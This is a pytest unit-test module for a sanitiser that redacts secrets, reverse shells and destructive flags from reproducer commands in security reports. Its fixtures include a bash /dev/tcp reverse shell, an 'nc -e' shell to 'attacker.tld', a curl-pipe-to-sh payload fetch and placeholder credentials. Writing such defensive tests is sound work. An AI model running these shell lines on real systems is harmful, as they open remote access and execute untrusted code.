"""ARG-025 — Unit tests for ``src.reports.replay_command_sanitizer``.

The sanitiser is the security gate for every reproducer command embedded
in an Asgard / Valhalla report; the tests here assert per-pattern
correctness, idempotency, target / canary handling, and type strictness.

The wider ≥50-pattern security sweep lives in
``backend/tests/security/test_report_no_secret_leak.py`` — this module
focuses on functional correctness with a smaller, easier-to-debug grid.
"""

from __future__ import annotations

import pytest
from src.reports.replay_command_sanitizer import (
    PLACEHOLDER_ASSET,
    PLACEHOLDER_ENDPOINT,
    REDACTED_API_KEY,
    REDACTED_AWS_KEY,
    REDACTED_BEARER,
    REDACTED_GH_TOKEN,
    REDACTED_GL_TOKEN,
    REDACTED_JWT,
    REDACTED_NT_HASH,
    REDACTED_PASSWORD,
    REDACTED_PRIVATE_KEY,
    REDACTED_REVERSE_SHELL,
    REDACTED_SLACK_TOKEN,
    REDACTED_STRIPE_KEY,
    REDACTED_TWILIO_KEY,
    SanitizeContext,
    sanitize_replay_command,
)


@pytest.fixture
def empty_ctx() -> SanitizeContext:
    return SanitizeContext()


@pytest.fixture
def web_ctx() -> SanitizeContext:
    return SanitizeContext(
        target="https://acme.example.com",
        endpoints=(
            "https://acme.example.com/api/v1/users",
            "https://api.acme.example.com",
        ),
    )


# ---------------------------------------------------------------------------
# Bearer / JWT / Authorization headers
# ---------------------------------------------------------------------------


def test_bearer_authorization_header_redacted(web_ctx: SanitizeContext) -> None:
    argv = [
        "curl",
        "-H",
        "Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.payload.sig",
        "https://acme.example.com/api/v1/users/42",
    ]
    out = sanitize_replay_command(argv, web_ctx)
    assert REDACTED_JWT in " ".join(out) or REDACTED_BEARER in " ".join(out)
    assert "eyJhbGciOiJIUzI1NiJ9" not in " ".join(out)
    assert "payload.sig" not in " ".join(out)


def test_bearer_token_short_slug_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["http", "GET", "/me", "Authorization: Bearer abc123def456ghi"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_BEARER in " ".join(out)
    assert "abc123def456ghi" not in " ".join(out)


def test_jwt_three_segment_redacted(empty_ctx: SanitizeContext) -> None:
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SIGNATUREvalueXYZ"
    argv = ["echo", jwt]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_JWT in " ".join(out)
    assert jwt not in " ".join(out)


# ---------------------------------------------------------------------------
# Cloud provider keys
# ---------------------------------------------------------------------------


def test_aws_access_key_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["aws", "s3", "ls", "--access-key-id", "AKIAIOSFODNN7EXAMPLE"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_AWS_KEY in " ".join(out)
    assert "AKIAIOSFODNN7EXAMPLE" not in " ".join(out)


def test_aws_secret_key_in_kv_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["env", "AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "wJalrXUtnFEMI" not in " ".join(out)


def test_github_pat_redacted(empty_ctx: SanitizeContext) -> None:
    pat = "ghp_aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789"
    argv = ["gh", "auth", "login", "--with-token", pat]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_GH_TOKEN in " ".join(out)
    assert pat not in " ".join(out)


def test_gitlab_pat_redacted(empty_ctx: SanitizeContext) -> None:
    glpat = "glpat-ABCDEFGHIJ1234567890"
    argv = ["curl", "-H", f"PRIVATE-TOKEN: {glpat}", "https://gitlab.example/api"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_GL_TOKEN in " ".join(out)
    assert glpat not in " ".join(out)


def test_slack_xoxb_token_redacted(empty_ctx: SanitizeContext) -> None:
    token = "xoxb-1234-5678-abcdefghijklmnop"
    argv = ["slack", "send", "--token", token]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_SLACK_TOKEN in " ".join(out) or REDACTED_PASSWORD in " ".join(out)
    assert token not in " ".join(out)


def test_stripe_publishable_test_key_redacted(empty_ctx: SanitizeContext) -> None:
    key = "pk_test_1234567890abcdefABCDEFGH"
    argv = ["curl", "-u", f"{key}:", "https://api.stripe.com/v1/charges"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_STRIPE_KEY in " ".join(out)
    assert key not in " ".join(out)


def test_twilio_account_sid_redacted(empty_ctx: SanitizeContext) -> None:
    sid = "AC" + bytes(range(16)).hex()
    argv = ["twilio", "api:core:messages:list", "--account-sid", sid]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_TWILIO_KEY in " ".join(out)
    assert sid not in " ".join(out)


def test_gcp_api_key_redacted(empty_ctx: SanitizeContext) -> None:
    key = "AIzaSyAbCdEfGhIjKlMnOpQrStUvWxYz1234567"
    argv = ["curl", f"https://maps.googleapis.com/maps/api/geocode/json?key={key}"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert key not in " ".join(out)


# ---------------------------------------------------------------------------
# Generic api_key / password key=value
# ---------------------------------------------------------------------------


def test_api_key_kv_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["curl", "https://api/?api_key=supersecretvalue1234"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "supersecretvalue1234" not in " ".join(out)
    assert REDACTED_API_KEY in " ".join(out)


def test_password_kv_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["mysql", "-u", "root", "--password=hunter2"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "hunter2" not in " ".join(out)
    assert REDACTED_PASSWORD in " ".join(out)


def test_password_flag_value_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["mysql", "-u", "root", "--password", "hunter2"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "hunter2" not in out
    assert REDACTED_PASSWORD in out


def test_short_p_flag_value_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["mysql", "-p", "supersecret"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "supersecret" not in out
    assert REDACTED_PASSWORD in out


# ---------------------------------------------------------------------------
# NT/LM hashes + private keys
# ---------------------------------------------------------------------------


def test_ntlm_pair_redacted(empty_ctx: SanitizeContext) -> None:
    argv = [
        "smbclient",
        "//host/share",
        "-U",
        "admin",
        "--pw-nt-hash",
        "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0",
    ]
    out = sanitize_replay_command(argv, empty_ctx)
    joined = " ".join(out)
    assert REDACTED_NT_HASH in joined
    assert "31d6cfe0d16ae931b73c59d7e0c089c0" not in joined


def test_pem_private_key_block_redacted(empty_ctx: SanitizeContext) -> None:
    blob = (
        "-----BEGIN RSA PRIVATE KEY-----\nABCDEFG12345\n-----END RSA PRIVATE KEY-----"
    )
    argv = ["echo", blob]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_PRIVATE_KEY in " ".join(out)
    assert "ABCDEFG12345" not in " ".join(out)


def test_openssh_private_key_header_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["echo", "-----BEGIN OPENSSH PRIVATE KEY-----"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_PRIVATE_KEY in " ".join(out)


# ---------------------------------------------------------------------------
# Reverse shells
# ---------------------------------------------------------------------------


def test_bash_reverse_shell_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["bash", "-c", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_REVERSE_SHELL in " ".join(out)
    assert "/dev/tcp" not in " ".join(out)


def test_nc_e_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["sh", "-c", "nc -e /bin/bash attacker.tld 1337"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_REVERSE_SHELL in " ".join(out)


def test_python_socket_redacted(empty_ctx: SanitizeContext) -> None:
    argv = [
        "python3",
        "-c",
        "import socket,os,pty;s=socket.socket();s.connect(('a',1))",
    ]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_REVERSE_SHELL in " ".join(out)


def test_pipe_to_shell_redacted(empty_ctx: SanitizeContext) -> None:
    argv = ["sh", "-c", "curl http://evil/ipayload | sh"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert REDACTED_REVERSE_SHELL in " ".join(out)


# ---------------------------------------------------------------------------
# Destructive flag stripping
# ---------------------------------------------------------------------------


def test_destructive_flags_stripped(empty_ctx: SanitizeContext) -> None:
    argv = ["rm", "-rf", "/tmp/cache", "--force", "--no-confirm"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "-rf" not in out
    assert "--force" not in out
    assert "--no-confirm" not in out
    assert out == ["rm", "/tmp/cache"]


def test_destructive_flags_case_insensitive(empty_ctx: SanitizeContext) -> None:
    argv = ["docker", "container", "--RM", "--Force", "alpine"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "--RM" not in out
    assert "--Force" not in out


def test_destructive_substring_not_stripped(empty_ctx: SanitizeContext) -> None:
    """`--no-confirm-required` MUST NOT be stripped — only exact `--no-confirm`."""
    argv = ["mytool", "--no-confirm-required"]
    out = sanitize_replay_command(argv, empty_ctx)
    assert "--no-confirm-required" in out


# ---------------------------------------------------------------------------
# Target / endpoint substitution
# ---------------------------------------------------------------------------


def test_target_replaced_with_asset(web_ctx: SanitizeContext) -> None:
    argv = ["curl", "-X", "GET", "https://acme.example.com/health"]
    out = sanitize_replay_command(argv, web_ctx)
    assert PLACEHOLDER_ASSET in " ".join(out) or PLACEHOLDER_ENDPOINT in " ".join(out)
    assert "acme.example.com" not in " ".join(out)


def test_endpoints_take_precedence_over_target(web_ctx: SanitizeContext) -> None:
    argv = ["curl", "https://acme.example.com/api/v1/users"]
    out = sanitize_replay_command(argv, web_ctx)
    joined = " ".join(out)
    assert PLACEHOLDER_ENDPOINT in joined
    assert "/api/v1/users" not in joined


def test_canary_preserved_in_target_substitution() -> None:
    ctx = SanitizeContext(
        target="https://acme.example.com",
        canaries=("CANARY-XYZ",),
    )
    argv = ["echo", "https://acme.example.com/CANARY-XYZ/probe"]
    out = sanitize_replay_command(argv, ctx)
    assert "CANARY-XYZ" in " ".join(out)
    assert "https://acme.example.com" in " ".join(out)


# ---------------------------------------------------------------------------
# Idempotency + type errors + edge cases
# ---------------------------------------------------------------------------


def test_idempotency_bearer(web_ctx: SanitizeContext) -> None:
    argv = ["curl", "-H", "Authorization: Bearer eyJabcdefghij"]
    once = sanitize_replay_command(argv, web_ctx)
    twice = sanitize_replay_command(once, web_ctx)
    assert once == twice


def test_idempotency_aws_key(empty_ctx: SanitizeContext) -> None:
    argv = ["aws", "s3", "ls", "--access-key-id", "AKIAIOSFODNN7EXAMPLE"]
    once = sanitize_replay_command(argv, empty_ctx)
    twice = sanitize_replay_command(once, empty_ctx)
    assert once == twice


def test_input_not_mutated(empty_ctx: SanitizeContext) -> None:
    argv = ["curl", "-H", "Authorization: Bearer eyJsecrettoken1234"]
    snapshot = list(argv)
    sanitize_replay_command(argv, empty_ctx)
    assert argv == snapshot


def test_empty_argv_returns_empty_list(empty_ctx: SanitizeContext) -> None:
    assert sanitize_replay_command([], empty_ctx) == []


def test_type_error_when_argv_is_str(empty_ctx: SanitizeContext) -> None:
    with pytest.raises(TypeError):
        sanitize_replay_command("curl https://x", empty_ctx)  # type: ignore[arg-type]


def test_type_error_when_argv_contains_int(empty_ctx: SanitizeContext) -> None:
    with pytest.raises(TypeError):
        sanitize_replay_command(["curl", 42], empty_ctx)  # type: ignore[list-item]


def test_type_error_when_context_is_not_sanitize_context() -> None:
    with pytest.raises(TypeError):
        sanitize_replay_command(["curl"], context={"target": "x"})  # type: ignore[arg-type]


def test_sanitize_context_is_frozen() -> None:
    ctx = SanitizeContext(target="https://acme.example")
    with pytest.raises((ValueError, TypeError, Exception)):
        ctx.target = "https://other.example"  # type: ignore[misc]


def test_canary_protects_secret_lookalike() -> None:
    """A canary that contains a Bearer-like substring must not be redacted."""
    ctx = SanitizeContext(canaries=("Bearer CANARY-OK",))
    argv = ["echo", "Bearer CANARY-OK"]
    out = sanitize_replay_command(argv, ctx)
    assert out == argv


def test_no_double_redaction_on_jwt_with_endpoint(web_ctx: SanitizeContext) -> None:
    jwt = "eyJabcabc.eyJabcabc.SIGNATURE12345"
    argv = [
        "curl",
        "-H",
        f"Authorization: Bearer {jwt}",
        "https://api.acme.example.com/me",
    ]
    out = sanitize_replay_command(argv, web_ctx)
    joined = " ".join(out)
    assert jwt not in joined
    assert "api.acme.example.com" not in joined
